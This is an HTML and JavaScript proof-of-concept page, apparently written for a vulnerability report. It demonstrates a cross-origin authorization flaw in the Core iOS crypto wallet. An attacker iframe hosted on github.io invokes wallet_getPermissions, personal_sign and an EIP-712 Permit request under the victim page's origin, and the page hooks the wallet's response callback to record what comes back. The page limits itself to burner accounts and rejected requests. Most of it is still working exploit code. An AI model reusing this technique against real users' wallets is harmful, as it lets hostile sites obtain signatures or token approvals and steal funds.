<!doctype html>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Core iOS cross-origin authorization PoC</title>
<style>
body{max-width:720px;margin:24px auto;padding:0 16px;font:15px/1.45 system-ui;color:#111}button{display:block;width:100%;margin:8px 0;padding:12px;text-align:left}button:disabled{opacity:.45}pre{padding:12px;border:1px solid #bbb;white-space:pre-wrap;overflow-wrap:anywhere}.valid{border:2px solid #b00020;padding:12px;font-weight:700}iframe{width:100%;height:72px;border:1px solid #bbb}
</style>

<h2>Core iOS cross-origin authorization PoC</h2>
<p>Victim A: <b id="originA"></b><br>Attacker B: <b id="originB"></b></p>
<p>Controlled origins and burner account only. Reject every signing request.</p>

<button id="connect">1. Connect Origin A</button>
<button id="permissions" disabled>2. B invokes wallet_getPermissions as A</button>
<button id="personal" disabled>3. B invokes personal_sign as A — REJECT</button>
<button id="permit" disabled>4. B invokes expired dummy Permit as A — REJECT</button>

<p id="verdict" class="valid" hidden></p>
<pre id="log">Loading controlled Origin B…</pre>
<iframe id="attacker" title="Controlled Origin B"></iframe>

<script>
'use strict';

const ATTACKER_URL='https://azza1231.github.io/pocpoc/attacker.html';
const IDS={permissions:733731,personal:733732,permit:733733};
const $=id=>document.getElementById(id);
const frame=$('attacker');
const attackerOrigin=new URL(ATTACKER_URL).origin;
const pending=new Map();
let account='';
let chainId='';
let childReady=false;
let permissionProven=false;

$('originA').textContent=location.origin;
$('originB').textContent=attackerOrigin;

function write(value){$('log').textContent+='\n'+value}
function valid(value){$('verdict').hidden=false;$('verdict').textContent=value}
function address(value){return /^0x[0-9a-fA-F]{40}$/.test(value)}

function grantedAccounts(result){
  return Array.isArray(result)?result.flatMap(p=>Array.isArray(p?.caveats)?p.caveats.flatMap(c=>c?.type==='restrictReturnedAccounts'&&Array.isArray(c.value)?c.value:[]):[]):[];
}

function observeCoreResponses(){
  if(window.__coreMinimalObserver)return true;
  if(typeof window.__coreProviderRespond!=='function'){write('ERROR: Core callback unavailable');return false}
  const original=window.__coreProviderRespond;
  window.__coreProviderRespond=function(id,error,result){
    const request=pending.get(id);
    if(request){
      write(`\nCORE RESPONSE ${request.method}\n${JSON.stringify({id,error,result},null,2)}`);
      if(id===IDS.permissions&&!error&&grantedAccounts(result).some(a=>a.toLowerCase()===account.toLowerCase())){
        permissionProven=true;
        $('personal').disabled=false;
        $('permit').disabled=false;
        valid('VALID: Cross-origin B reused Origin A authorization.');
      }else if(error?.code===4001||/reject|cancel/i.test(error?.message||'')){
        valid(`VALID: Core admitted B's ${request.method} request as A; tester rejected it.`);
      }else if(!error){
        valid(`STOP: ${request.method} was approved. Do not use the returned result.`);
      }
      pending.delete(id);
    }
    return original.apply(this,arguments);
  };
  window.__coreMinimalObserver=true;
  return true;
}

function send(type,id,method){
  if(!childReady||!observeCoreResponses())return;
  pending.set(id,{method});
  write(`\nB SENDS ${method}\nactual B: ${attackerOrigin}\nclaimed A: ${location.origin}`);
  frame.contentWindow.postMessage({type,id,account,chainId},attackerOrigin);
}

addEventListener('message',event=>{
  if(event.source!==frame.contentWindow||event.origin!==attackerOrigin)return;
  const data=event.data||{};
  if(data.type==='READY'){
    childReady=data.actualOrigin===attackerOrigin&&data.victimOrigin===location.origin&&data.isSubframe===true&&data.bridgeVisible===true;
    $('permissions').disabled=!(childReady&&address(account));
    $('log').textContent=`Browser-authenticated B: ${event.origin}\nVictim A: ${location.origin}\nCross-origin subframe: ${data.isSubframe}\nCore bridge in B: ${data.bridgeVisible}\nStrict proof: ${childReady}`;
  }
  if(data.type==='SENT')write(`B BRIDGE CALL\n${JSON.stringify(data.proof,null,2)}`);
  if(data.type==='ERROR'){pending.delete(data.id);write('ERROR: '+data.message)}
});

const child=new URL(ATTACKER_URL);
child.searchParams.set('victimOrigin',location.origin);
child.searchParams.set('v',Date.now());
frame.src=child.href;

$('connect').onclick=async()=>{
  try{
    const accounts=await ethereum.request({method:'eth_requestAccounts'});
    account=accounts?.[0]||'';
    chainId=await ethereum.request({method:'eth_chainId'});
    if(!address(account))throw new Error('No valid account returned');
    write(`\nA CONNECTED\naccount: ${account}\nchainId: ${chainId}`);
    $('connect').disabled=true;
    $('permissions').disabled=!childReady;
  }catch(error){write('CONNECT ERROR: '+(error?.message||error))}
};

$('permissions').onclick=()=>send('PERMISSIONS',IDS.permissions,'wallet_getPermissions');
$('personal').onclick=()=>permissionProven&&send('PERSONAL',IDS.personal,'personal_sign');
$('permit').onclick=()=>permissionProven&&send('PERMIT',IDS.permit,'eth_signTypedData_v4');
</script>
